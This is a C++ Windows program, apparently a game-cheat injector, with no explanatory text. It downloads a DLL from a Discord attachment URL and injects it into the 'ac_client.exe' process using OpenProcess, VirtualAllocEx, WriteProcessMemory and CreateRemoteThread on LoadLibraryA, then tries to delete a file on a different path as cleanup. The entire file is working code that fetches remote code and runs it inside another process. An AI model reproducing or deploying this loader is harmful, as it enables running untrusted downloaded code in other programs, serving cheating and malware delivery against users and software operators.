#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"wininet.lib")

DWORD GetProcId(const char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
        //std::cout << "Snapshot failed" << std::endl;
    }
    CloseHandle(hSnap);
    std::cout << "Snapshot success." << std::endl;
    return procId;
}


int main()
{
    HRESULT hr;
    LPCTSTR dll = _T("https://cdn.discordapp.com/attachments/1039636759073521725/1073465142005735424/dll.dll"), filePath = _T("C:\\dll.dll");
    hr = URLDownloadToFile(0, dll, filePath, 0, 0);


    const char* dllPath = "C:\\dll.dll";
    const char* procName = "ac_client.exe";
    DWORD procId = 0;

    while(!procId)
    {
        procId = GetProcId(procName);
        Sleep(30);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (loc)
        {
            WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
        }

        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

        if (hThread)
        {
            CloseHandle(hThread);
        }
    }

    if (hProc)
    {
        CloseHandle(hProc);
    }
    system("del C:\\Users\\me\\Desktop\\dll.dll");
    return 0;
}

